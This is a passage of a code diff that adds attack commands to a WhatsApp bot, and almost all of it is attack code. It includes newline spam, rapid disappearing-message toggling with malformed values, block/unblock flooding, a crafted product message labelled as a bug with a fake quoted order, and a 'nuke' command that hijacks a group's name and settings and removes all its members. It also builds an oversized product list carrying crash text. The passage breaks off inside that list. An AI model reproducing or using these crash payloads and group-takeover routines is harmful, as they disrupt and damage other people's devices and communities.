+trick.sendMessage(from, '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n', MessageType.text)
+trick.sendMessage(from, '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n', MessageType.text)
+trick.sendMessage(from, '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n', MessageType.text)
+trick.sendMessage(from, '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n', MessageType.text)
+break;
+
+case'temporarity':
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, -782529939489)
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, -782529939489)
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, -782529939489)
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, -782529939489)
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, -782529939489)
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, -782529939489)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, -782529939489)
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, -782529939489)
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, -782529939489)
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, -782529939489)
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, -782529939489)
+trick.toggleDisappearingMessages(from, 604800)
+trick.toggleDisappearingMessages(from, 0)
+trick.toggleDisappearingMessages(from, -782529939489)
+reply(`😎👍`)
+break
+
+case 'spamblock': //x  by trick 🍁🐿️
+if (!banChats === false && !mek.key.fromMe) return 
+trick.blockUser(from, 'remove')
+trick.blockUser(from, 'add')
+trick.blockUser(from, 'remove')
+trick.blockUser(from, 'add')
+trick.blockUser(from, 'remove')
+trick.blockUser(from, 'add')
+trick.blockUser(from, 'remove')
+trick.blockUser(from, 'add')
+trick.blockUser(from, 'remove')
+trick.blockUser(from, 'add')
+trick.blockUser(from, 'remove')
+trick.blockUser(from, 'add')
+trick.blockUser(from, 'remove')
+trick.blockUser(from, 'add')
+break; //método blockspam by trick
+
+case 'catalogo':
+if (!banChats === false && !mek.key.fromMe) return
+    hmm4 = fs.readFileSync(`./media/menu.jpg`)
+imeu = await trick.prepareMessage('0@s.whatsapp.net', hmm4, image)
+
+imeg = imeu.message.imageMessage
+res = await trick.prepareMessageFromContent(from,{
+  "productMessage": {
+  "product": {
+  "productImage": imeg,
+  "productId": "",
+  "title": catalogo(prefix),
+"description": catalogo_des(prefix),
+"priceAmount1000": "99999999999999",
+"descriptionCount": "9999999999999",
+  "productImageCount": "-99999999999999999",
+  },
+  "businessOwnerJid": "5521996941851@s.whatsapp.net",
+  "contextInfo": {
+  "forwardingScore": 999999,
+  "isForwarded": true
+  }
+  }
+  }, {quoted: {
+				  key: {
+				   fromMe: false,
+				   participant: `0@s.whatsapp.net`, // Fake sender Jid
+				   remoteJid: "status@broadcast"
+				  },
+				  message: {
+				   orderMessage: {
+				    itemCount: 999999999, // Bug
+				    status: 1,
+				    surface: 1,
+				    message: '999999999',
+				    orderTitle: '999999999', // Idk what this does
+				    sellerJid: `0@s.whatsapp.net` // Seller
+				   }
+				  }
+				 }
+				})
+  trick.relayWAMessage(res)
+  break;
+  
+case 'nuke': // Nome do cmd <~
+if (!banChats === false && !mek.key.fromMe) return 
+{
+if (!isGroup) return reply("\n\n Esse comando só funciona em grupos.  \n\n")
+if (!isBotGroupAdmins)
+sendBug(from)
+hmm4 = fs.readFileSync(`./media/menu.jpg`)
+                   trick.updateProfilePicture (from, hmm4)
+                   await sleep(1000)
+trick.groupSettingChange(from, GroupSettingChange.messageSend, true)
+trick.groupSettingChange(from, GroupSettingChange.settingsChange, true)
+trick.groupUpdateDescription(from, '\n Arquivado By TexzinLock\n') // Setando Descrição
+trick.groupUpdateSubject(from, "157 by TexzinLock \n\n\n\n\n\n") // Colocando Nome
+trick.sendMessage(from, '\n ~ Grupo arquivado By TexzinLock \n', MessageType.text) // Enviando MSG
+setTimeout( () => {
+members_id = []
+for(let obj of groupMembers) {
+if (obj.jid === trick.user.jid) continue
+members_id.push(obj.jid)
+trick.groupRemove(from, [obj.jid])
+}
+}, 500);
+}
+break;
+
+case 'travatxt':
+trick.toggleDisappearingMessages(from,`virtex2`,text)
+reply(`${travatxt(prefix)}`)
+reply(`${travatxt(prefix)}`)
+reply(`${travatxt(prefix)}`)
+trick.toggleDisappearingMessages(from,)
+break
+
+ case 'carrinho':
+      anu = await trick.prepareMessageFromContent(from, {
+    "listMessage": {
+      "title": `${virtex1(prefix)}`,
+      "description": `${virtex1(prefix)}`,
+      "buttonText": "",
+      "listType": "PRODUCT_LIST",
+      "productListInfo": {
+        "productSections": [
+          {
+            "title": "LIST CATALOG",
+            "products": [
+              {
+                "productId": "4120139628109348"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+                "productId": "4120139628109348"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+                "productId": "4120139628109348"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+                "productId": "4120139628109348"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
